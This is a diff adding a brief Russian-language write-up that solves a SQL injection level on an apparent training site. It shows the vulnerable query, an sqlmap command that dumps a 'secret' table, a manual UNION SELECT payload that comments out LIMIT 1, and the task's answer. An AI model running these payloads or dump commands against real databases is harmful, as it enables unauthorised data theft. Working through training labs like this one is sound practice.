@@ -1,0 +1,18 @@
+https://sql.training.hackerdom.ru/4qjqhweh.php
+----------------------------------------------
+
+Таблицы: users, secret
+Поля таблицы users: id, login, pass
+В таблице secret три поля
+Запрос: SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
+
+sqlmap -u "https://sql.training.hackerdom.ru/4qjqhweh.php?text=i" -D sql_level4 -T secret --dump
+
+так же можно сделать sqlmap`ом но вот правильное решение.
+
+Как и во второй таске я буду использовать union select
+1' union select * from secret where ggg='abc' -- -
+опять же коментирую, из за limit 1
+
+и вот ответ:
+super-secret-data
